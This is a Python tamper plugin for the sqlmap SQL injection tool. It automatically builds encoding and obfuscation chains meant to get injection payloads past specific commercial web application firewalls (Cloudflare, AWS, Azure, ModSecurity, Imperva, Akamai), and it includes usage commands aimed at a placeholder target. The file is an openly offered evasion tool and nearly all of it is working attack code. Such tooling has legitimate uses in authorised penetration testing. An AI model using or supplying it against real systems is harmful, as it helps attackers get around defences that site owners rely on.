"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission

Tamper script: meta_tamper.py
Description: Meta combiner that auto-chains tampers based on target WAF
Author: Regaan
Priority: HIGHEST

Usage:
    sqlmap -u "http://target.com?id=1" --tamper=meta_tamper

    # Set WAF via SQLMap option or kwargs
    sqlmap ... --tamper=meta_tamper --technique=U

This script auto-selects the best tamper chain based on:
1. Detected WAF (if using SQLMap's --identify-waf)
2. User-specified target
3. Default balanced chain

Chains can be customized via environment variable:
    export SQLMAP_WAF_TARGET=cloudflare,aws
"""

import sys
import os

# Add parent directory to path for framework import
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from lib.core.enums import PRIORITY
    __priority__ = PRIORITY.HIGHEST
except ImportError:
    pass

# Import individual tampers
from tamper_framework.transformer import SQLTransformer
from tamper_framework.transformations import (
    create_keyword_wrap_rule,
    create_space_replace_rule,
    create_case_alternate_rule,
    create_value_encode_rule,
    create_version_comment_vary_rule,
    create_comment_chaos_rule,
    create_hex_encode_rule,
    create_numeric_obfuscation_rule,
    create_logical_swap_rule,
    create_homoglyph_rule,
    create_function_wrap_rule,
)


# WAF-specific transformation chains
WAF_CHAINS = {
    'cloudflare': [
        ('keyword_wrap', create_keyword_wrap_rule, {}),
        ('space_replace', create_space_replace_rule, {}),
        ('value_encode', create_value_encode_rule, {}),
        ('case_alternate', create_case_alternate_rule, {}),
    ],
    'aws': [
        ('logical_swap', create_logical_swap_rule, {}),
        ('version_comment', create_version_comment_vary_rule, {'fixed_version': '50700'}),
        ('space_replace', create_space_replace_rule, {}),
        ('value_encode', create_value_encode_rule, {}),
        ('hex_encode', create_hex_encode_rule, {}),
        ('numeric_hex', create_numeric_obfuscation_rule, {'style': 'hex'}),
        ('case_alternate', create_case_alternate_rule, {}),
    ],
    'azure': [
        ('keyword_wrap', create_keyword_wrap_rule, {}),
        ('comment_chaos', create_comment_chaos_rule, {'seed': 'azure'}),
        ('value_encode', create_value_encode_rule, {}),
        ('hex_encode', create_hex_encode_rule, {}),
        ('numeric_hex', create_numeric_obfuscation_rule, {'style': 'hex'}),
        ('case_alternate', create_case_alternate_rule, {}),
    ],
    'modsec': [
        ('case_alternate', create_case_alternate_rule, {}),
        ('version_comment', create_version_comment_vary_rule, {}),
        ('comment_chaos', create_comment_chaos_rule, {'seed': 'modsec'}),
        ('value_encode', create_value_encode_rule, {}),
        ('numeric_math', create_numeric_obfuscation_rule, {'style': 'math'}),
    ],
    'imperva': [
        ('case_alternate', create_case_alternate_rule, {}),
        ('homoglyph', create_homoglyph_rule, {'aggressive': False}),
        ('function_wrap', create_function_wrap_rule, {'wrap_style': 'if'}),
        ('comment_chaos', create_comment_chaos_rule, {'seed': 'imperva'}),
        ('value_encode', create_value_encode_rule, {}),
        ('hex_encode', create_hex_encode_rule, {}),
    ],
    'akamai': [
        ('logical_swap', create_logical_swap_rule, {}),
        ('version_comment', create_version_comment_vary_rule, {}),
        ('space_replace', create_space_replace_rule, {}),
        ('value_encode', create_value_encode_rule, {}),
        ('hex_encode', create_hex_encode_rule, {}),
        ('numeric_float', create_numeric_obfuscation_rule, {'style': 'float'}),
        ('case_alternate', create_case_alternate_rule, {}),
    ],
    # Default balanced chain
    'default': [
        ('keyword_wrap', create_keyword_wrap_rule, {}),
        ('space_replace', create_space_replace_rule, {}),
        ('value_encode', create_value_encode_rule, {}),
        ('case_alternate', create_case_alternate_rule, {}),
    ],
}


def get_waf_target():
    """Get target WAF from environment or default"""
    # Check environment variable
    waf_env = os.environ.get('SQLMAP_WAF_TARGET', '').lower()
    if waf_env:
        return waf_env.split(',')
    return ['default']


def dependencies():
    pass


def tamper(payload, **kwargs):
    """
    Meta tamper that combines WAF-specific chains
    
    Set target WAF via:
    1. Environment: export SQLMAP_WAF_TARGET=cloudflare,aws
    2. Uses default balanced chain if not set
    
    Multiple WAFs can be specified (comma-separated) for layered bypass.
    
    Example:
        SQLMAP_WAF_TARGET=cloudflare,modsec sqlmap -u "..." --tamper=meta_tamper
    """
    
    if not payload:
        return payload
    
    # Get target WAFs
    waf_targets = get_waf_target()
    
    # Build combined chain
    transformer = SQLTransformer()
    used_rules = set()
    
    for waf in waf_targets:
        chain = WAF_CHAINS.get(waf, WAF_CHAINS['default'])
        
        for rule_name, rule_factory, rule_kwargs in chain:
            # Avoid duplicate rules
            if rule_name not in used_rules:
                transformer.add_rule(rule_factory(**rule_kwargs))
                used_rules.add(rule_name)
    
    # Transform
    try:
        result = transformer.transform(payload)
        return result
    except Exception as e:
        return payload


if __name__ == "__main__":
    # Test with different WAF targets
    test_query = "SELECT * FROM users WHERE id=1 AND name='admin'"
    
    print("=" * 70)
    print("Meta Tamper - WAF-Specific Chain Combiner")
    print("=" * 70)
    
    for waf in ['cloudflare', 'aws', 'azure', 'modsec', 'imperva', 'akamai']:
        os.environ['SQLMAP_WAF_TARGET'] = waf
        result = tamper(test_query)
        print(f"\n[{waf.upper()}]")
        print(f"Original:    {test_query}")
        print(f"Transformed: {result[:100]}...")
